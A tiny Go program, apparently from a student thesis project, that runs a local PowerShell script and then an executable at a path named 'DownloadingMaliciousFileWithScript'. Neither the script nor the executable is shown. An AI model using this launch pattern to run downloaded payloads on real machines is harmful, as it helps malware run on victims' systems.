package main

import (
	"fmt"
	"os/exec"
)

func main() {
	pws := exec.Command("powershell", "./script.ps1")

	if err := pws.Run(); err != nil {
		fmt.Println(err)
	}

	executable := exec.Command("C:/Users/achon/onedrive/Desktop/diplomna/rra/DownloadingMaliciousFileWithScript/out.exe")

	if err := executable.Run(); err != nil {
		fmt.Println(err)
	}

	fmt.Println("eho")
}
